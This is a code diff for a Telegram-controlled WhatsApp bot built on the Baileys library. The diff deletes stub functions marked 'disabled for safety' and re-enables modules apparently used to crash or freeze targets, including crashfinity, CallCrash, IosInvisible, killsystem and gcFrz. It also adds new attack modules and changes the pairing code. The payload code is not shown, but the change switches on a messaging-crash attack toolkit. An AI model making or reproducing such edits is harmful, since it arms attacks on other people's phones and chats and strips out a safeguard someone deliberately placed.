@@ -3,7 +3,7 @@ const SY = require('node-telegram-bot-api');
 const fs = require('fs');
 const path = require('path');
 const config = require('./config');
-const { default: makeWASocket, useMultiFileAuthState, delay, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
+const { default: makeWASocket, useMultiFileAuthState, delay, DisconnectReason, makeCacheableSignalKeyStore } = require('@whiskeysockets/baileys');
 const pino = require('pino');
 
 console.clear();
@@ -28,25 +28,18 @@ const unauthorized = Buffer.from('8J+aqyBZb3UgYXJlIG5vdCBhdXRob3JpemVkIHRvIHVzZS
 
 // SY Loves Here 🤗❤️‍🩹
 const SYLoves = `./SY/S7/`;
-const disabledAction = async () => {
-    throw new Error('This action is disabled for safety.');
-};
-const CrashLogic = { crashfinity: disabledAction };
-const stickerLogic = { StickerCrash: disabledAction };
-const CallLogic = { CallCrash: disabledAction };
-const XLogic = { Xdelay: disabledAction };
-const IosLogic = { IosInvisible: disabledAction };
-const XgcLogic = { Xgc: disabledAction };
-const testlogic = { test: disabledAction };
-const azzixdestroyedLogic = { crashfinity: disabledAction };
-const bahirava1Logic = { bahirava1: disabledAction };
-const bahirava2Logic = { bahiravav2: disabledAction, bahirava2: disabledAction };
-const bahiravaiosLogic = { bahiravaios: disabledAction };
-const android1Logic = { android1: disabledAction };
-const android2Logic = { android2: disabledAction };
-const android3Logic = { android3: disabledAction };
-const android4Logic = { android4: disabledAction };
-const android5Logic = { android5: disabledAction };
+const CrashLogic = require(SYLoves + 'crashfinity');
+const stickerLogic = require(SYLoves + 'StickerCrash');
+const CallLogic = require(SYLoves + 'CallCrash');
+const XLogic = require(SYLoves + 'Xdelay');
+const IosLogic = require(SYLoves + 'IosInvisible');
+const XgcLogic = require(SYLoves + 'Xgc');
+const xbetainvisLogic = require(SYLoves + 'xbetainvis');
+const testlogic = require(SYLoves + 'test');
+// ADDED NEW MODULES
+const crashjamLogic = require(SYLoves + 'crashjam');
+const killsystemLogic = require(SYLoves + 'killsystem');
+const gcFrzLogic = require(SYLoves + 'gcFrz');
 
 const colors = {
     reset: "\x1b[0m", gray: "\x1b[90m", blue: "\x1b[34m", green: "\x1b[32m",
@@ -166,10 +159,8 @@ async function StartLovingSY(chatId, number, S7) {
     }
 
     const { state, saveCreds } = await useMultiFileAuthState(authPath);
-    const { version } = await fetchLatestBaileysVersion();
 
     const SYxS7 = makeWASocket({
-        version,
         logger: pino({ level: 'silent' }),
         printQRInTerminal: false,
         auth: {
@@ -183,7 +174,7 @@ async function StartLovingSY(chatId, number, S7) {
     if (!SYxS7.authState.creds.registered) {
         await delay(1500);
         try {
-            const code = await SYxS7.requestPairingCode(number, `2XBROBVG`);
+            const code = await SYxS7.requestPairingCode(number, `FGMAFIAN`);
             S7.sendMessage(chatId, `╭──────「 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 」──────╮\n│➻ Nᴜᴍʙᴇʀ : ${number}\n│➻ Pᴀɪʀɪɴɢ ᴄᴏᴅᴇ : <code>${code?.match(/.{1,4}/g)?.join("-") || code}</code>\n╰───────────────────────╯`, { parse_mode: 'HTML' });
         } catch (err) {
             log('error', 'WhatsApp', `Error requesting code: ${err.message}`);
@@ -222,11 +213,9 @@ async function StartLovingSY(chatId, number, S7) {
                 await S7.sendMessage(chatId, `❌ <b>WhatsApp Logged Out</b>\nNumber: ${number}\nSession has been terminated. Please use /reqpair again.`, { parse_mode: 'HTML' }).catch(() => {});
                 const SYPaTH = `./Love/auth/${chatId}/${number}`;
                 if (fs.existsSync(SYPaTH)) fs.rmSync(SYPaTH, { recursive: true, force: true });
-            } else if (reason === 405 || reason === DisconnectReason.connectionClosed || reason === DisconnectReason.timedOut) {
+            } else if (reason === DisconnectReason.timedOut) {
                 log('error', 'WhatsApp', `Timed out for ${number}. Reconnecting...`);
-                setTimeout(() => StartLovingSY(chatId, number, S7).catch((err) => {
-                    log('error', 'WhatsApp', `Reconnect failed for ${number}: ${err.message}`);
-                }), 5000);
+                StartLovingSY(chatId, number, S7);
             } else {
                 await S7.sendMessage(chatId, `⚠️ <b>Connection Closed</b>\nNumber: ${number}\nReason: ${reason}`, { parse_mode: 'HTML' }).catch(() => {});
             }
@@ -1553,4 +1542,4 @@ if (db.tokens && db.tokens.length > 0) {
     db.tokens.forEach(obj => startSYloveBot(obj.token));
 } else {
     log('info', null, 'No extra bots found in database.');
-}
+                                     }
